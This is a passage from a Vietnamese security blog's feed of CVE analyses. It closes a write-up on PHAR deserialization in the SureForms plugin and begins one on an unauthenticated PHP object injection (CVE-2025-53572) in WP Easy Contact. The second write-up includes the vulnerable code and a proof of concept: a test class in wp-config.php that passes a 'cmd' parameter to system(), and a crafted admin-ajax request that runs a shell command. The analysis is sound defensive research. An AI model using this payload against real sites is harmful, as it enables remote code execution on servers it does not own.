href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/result.png&#34; title=&#34;RCE khi admin x√≥a entry&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;RCE khi admin x√≥a entry&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/result.png&#39; alt=&#34;Result&#34; height=&#34;841&#34; width=&#34;1486&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;RCE khi admin x√≥a entry&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-warning&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;C·∫£nh b√°o&lt;/p&gt;&lt;p&gt;Sau khi th·ª≠ nhi·ªÅu phi√™n b·∫£n PHP kh√°c nhau, t√¥i nh·∫≠n th·∫•y r·∫±ng: H√†m &lt;code&gt;file_exists()&lt;/code&gt; ch·ªâ ho·∫°t ƒë·ªông ·ªü c√°c phi√™n b·∫£n &lt;code&gt;&amp;lt;=7.4&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;M·ªôt s·ªë h√†m kh√°c d√πng ƒë·ªÉ khai th√°c PHAR Deserialization:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;copy                file_exists         file_get_contents   file_put_contents   &#xA;file                fileatime           filectime           filegroup           &#xA;fileinode           filemtime           fileowner           fileperms           &#xA;filesize            filetype            fopen               is_dir              &#xA;is_executable       is_file             is_link             is_readable         &#xA;is_writable         lstat               mkdir               parse_ini_file      &#xA;readfile            rename              rmdir               stat                &#xA;touch               unlink  &lt;/code&gt;&lt;/pre&gt;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;PHP Object Injection trong SureForm &amp;lt;= 1.7.3&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác s·ª≠ d·ª•ng &lt;code&gt;file_exists()&lt;/code&gt; v√† &lt;code&gt;unlink()&lt;/code&gt; tr·ª±c ti·∫øp tr√™n ƒë∆∞·ªùng d·∫´n ƒë∆∞·ª£c ki·ªÉm so√°t b·ªüi user m√† kh√¥ng c√≥ r√†ng bu·ªôc ph·∫°m vi truy c·∫≠p file. Tuy kh√¥ng c√≥ POP chain s·∫µn trong plugin, nh∆∞ng n·∫øu h·ªá th·ªëng c√†i ƒë·∫∑t th√™m plugin ho·∫∑c theme c√≥ POP chain, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ m·ªü r·ªông m·ª©c ƒë·ªô khai th√°c ƒë·∫øn x√≥a file, ƒë·ªçc d·ªØ li·ªáu nh·∫°y c·∫£m ho·∫∑c th·∫≠m ch√≠ th·ª±c thi m√£ (RCE). B·∫£n v√° 1.7.4 x·ª≠ l√Ω v·∫•n ƒë·ªÅ b·∫±ng vi·ªác chu·∫©n ho√° v√† gi·ªõi h·∫°n ƒë∆∞·ªùng d·∫´n file v√†o th∆∞ m·ª•c upload h·ª£p l·ªá nh·∫±m lo·∫°i b·ªè vector khai th√°c.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;L·ªói ph√°t sinh t·ª´ vi·ªác thao t√°c file tr·ª±c ti·∫øp d·ª±a tr√™n input ng∆∞·ªùi d√πng ch∆∞a ki·ªÉm so√°t.&lt;/li&gt;&#xA;&lt;li&gt;Vi·ªác ch·ªâ d√πng &lt;code&gt;file_exists()&lt;/code&gt; c√≥ th·ªÉ d·∫´n ƒë·∫øn PHAR deserialization tr√™n PHP ‚â§7.4.&lt;/li&gt;&#xA;&lt;li&gt;D√π plugin kh√¥ng c√≥ POP chain s·∫µn, m√¥i tr∆∞·ªùng WordPress th∆∞·ªùng c√†i nhi·ªÅu plugin ‚Üí kh·∫£ nƒÉng gh√©p chain r·∫•t cao.&lt;/li&gt;&#xA;&lt;li&gt;B·∫£n v√° th√™m ki·ªÉm tra chu·∫©n h√≥a ƒë∆∞·ªùng d·∫´n, gi·ªõi h·∫°n ph·∫°m vi file v√† tr√°nh s·ª≠ d·ª•ng tr·ª±c ti·∫øp path ƒë·∫øn filesystem.&lt;/li&gt;&#xA;&lt;li&gt;C√°c h√†m file-operation lu√¥n ti·ªÅm ·∫©n nguy c∆° khai th√°c n·∫øu input kh√¥ng ƒë∆∞·ª£c ki·ªÉm so√°t ch·∫∑t ch·∫Ω.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/sureforms/vulnerability/wordpress-sureforms-plugin-1-7-3-unauthenticated-php-object-injection-phar-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress SureForm Plugin &amp;lt;= 1.7.3 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-53572 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-18-cve-2025-53572/</link>
      <pubDate>Tue, 18 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-18-cve-2025-53572/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-18-cve-2025-53572/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;Deserialization of Untrusted Data&lt;/strong&gt; trong &lt;strong&gt;emarket-design WP Easy Contact&lt;/strong&gt; cho ph√©p &lt;strong&gt;Object Injection&lt;/strong&gt;.&lt;br&gt;&#xA;V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;WP Easy Contact&lt;/strong&gt;: t·ª´ &lt;em&gt;n/a&lt;/em&gt; ƒë·∫øn &lt;strong&gt;4.0.1&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53572&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53572&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.0.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.0.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-easy-contact/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Easy Contact Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;WP Easy Contact&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.1&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.2&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng xu·∫•t ph√°t t·ª´ vi·ªác cho ph√©p attacker kh·ªüi t·∫°o ƒë·ªëi t∆∞·ª£ng t√πy √Ω t·ª´ input ‚Üí &lt;strong&gt;PHP Object Injection&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$widg_arr = explode(&amp;#34;-&amp;#34;,$div_id);&#xA;$mywidg = new $widg_arr[1]();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° b·ªï sung whitelist v√† sanitize input ‚Üí ch·ªâ cho ph√©p kh·ªüi t·∫°o class h·ª£p l·ªá, lo·∫°i b·ªè l·ªó h·ªïng.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-18-cve-2025-53572/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-11-18-cve-2025-53572/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-18-cve-2025-53572/diff.png&#39; alt=&#34;Diff&#34; height=&#34;766&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω m·ªôt Ajax cho unauthenticated user (&lt;code&gt;wp_ajax_nopriv&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_nopriv_emd_get_widg_pagenum&amp;#39;, &amp;#39;emd_get_widg_pagenum&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi g·ª≠i request ƒë·∫øn &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi &lt;code&gt;action=emd_get_widg_pagenum&lt;/code&gt;, callback &lt;code&gt;emd_get_widg_pagenum&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c th·ª±c thi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function emd_get_widg_pagenum(){&#xA;&#x9;$response = false;&#xA;&#x9;$pageno = isset($_GET[&amp;#39;pageno&amp;#39;]) ? (int) $_GET[&amp;#39;pageno&amp;#39;] : 1;&#xA;&#x9;$div_id = isset($_GET[&amp;#39;div_id&amp;#39;]) ? sanitize_text_field($_GET[&amp;#39;div_id&amp;#39;]) : &amp;#39;&amp;#39;;&#xA;&#x9;$myapp = isset($_GET[&amp;#39;app&amp;#39;]) ? sanitize_text_field($_GET[&amp;#39;app&amp;#39;]) : &amp;#39;&amp;#39;;&#xA;&#x9;if(!empty($div_id)){&#xA;&#x9;&#x9;$pids = Array();&#xA;        $front_ents = emd_find_limitby(&amp;#39;frontend&amp;#39;, $myapp);&#xA;&#x9;&#x9;$widg_arr = explode(&amp;#34;-&amp;#34;,$div_id);&#xA;&#x9;&#x9;$mywidg = new $widg_arr[1]();&#xA;&#x9;&#x9;...&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê·ªÉ ƒëo·∫°n &lt;code&gt;new $widg_arr[1]()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi, c·∫ßn v∆∞·ª£t qua ƒëi·ªÅu ki·ªán &lt;code&gt;if(!empty($div_id))&lt;/code&gt;, t·ª©c ph·∫£i truy·ªÅn gi√° tr·ªã cho tham s·ªë &lt;code&gt;div_id&lt;/code&gt; trong GET request.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$widg_arr[1]&lt;/code&gt; l√† ph·∫ßn t·ª≠ ƒë∆∞·ª£c l·∫•y t·ª´ m·∫£ng sau khi &lt;code&gt;explode&lt;/code&gt; gi√° tr·ªã &lt;code&gt;$_GET[&#39;div_id&#39;]&lt;/code&gt;. V√≠ d·ª•, n·∫øu &lt;code&gt;div_id=abc-Class&lt;/code&gt; th√¨ &lt;code&gt;$widg_arr[1]&lt;/code&gt; s·∫Ω l√† &lt;code&gt;Class&lt;/code&gt;, cho ph√©p kh·ªüi t·∫°o ƒë·ªëi t∆∞·ª£ng t√πy √Ω th√¥ng qua &lt;code&gt;new $widg_arr[1]()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum&amp;amp;div_id=abc-Class&amp;#34;] &#xA;    --&amp;gt; B[&amp;#34;WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Callback: emd_get_widg_pagenum()&amp;#34;]&#xA;&#xA;C --&amp;gt; D{&amp;#34;Check if div_id is not empty&amp;#34;}&#xA;D -- True --&amp;gt; E[&amp;#34;explode(&amp;#39;-&amp;#39;, div_id) ‚Üí $widg_arr&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Instantiate object: new $widg_arr[1]()&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o class ƒë·ªÉ test ƒë·∫∑t trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class ObjectInjection&#xA;{&#xA;  public $command;&#xA;&#xA;  public function __construct(){&#xA;    $this-&amp;gt;command = $_GET[&amp;#39;cmd&amp;#39;];&#xA;  }&#xA;  function __destruct(){&#xA;  &#x9;die(system($this-&amp;gt;command));&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;G·ª≠i l·∫°i request v·ªõi payload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum&amp;amp;div_id=abc-ObjectInjection&amp;amp;cmd=ls&amp;#43;/ HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-18-cve-2025-53572/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-11-18-cve-2025-53572/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-18-cve-2025-53572/result.png&#39; alt=&#34;Result&#34; height=&#34;787&#34; width=&#34;1477&#34;&gt;&lt;/a&gt;&lt;figcaption 